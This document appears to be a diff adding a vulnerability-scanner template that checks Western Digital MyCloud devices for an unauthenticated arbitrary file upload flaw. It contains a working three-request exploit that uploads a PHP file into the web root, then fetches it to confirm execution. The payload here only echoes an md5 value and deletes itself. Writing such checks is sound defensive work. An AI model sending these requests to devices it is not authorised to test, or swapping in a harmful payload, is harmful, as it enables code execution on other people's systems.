@@ -1,0 +1,36 @@
+id: western-digital-mycloud-multi-uploadify-file-upload
+
+info:
+  name: Western Digital MyCloud Multi Uploadify File Upload
+  author: xpoc
+  severity: critical
+  verified: true
+  reference:
+    - https://www.exploitee.rs/index.php/Western_Digital_MyCloud#.2Fjquery.2Fuploader.2Fmulti_uploadify.php_.28added_08.2F06.2F2017.29
+  created: 2023/06/22
+
+
+set:
+    f1: randomInt(40000, 44800)
+    rboundary: randomLowercase(8)
+    randname: randomLowercase(6)
+rules:
+    r0:
+        request:
+            method: GET
+            path: /web/jquery/uploader/multi_uploadify.php?status=1
+        expression: response.status == 302 && response.headers["location"].contains("status=1")
+    r1:
+        request:
+            method: POST
+            path: /web/jquery/uploader/multi_uploadify.php?folder=/var/www/
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"Filedata[]\"; filename=\"{{randname}}.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo md5({{f1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+        expression: response.status == 302
+    r2:
+        request:
+            method: GET
+            path: /{{randname}}.php
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(f1))))
+expression: r0() && r1() && r2()
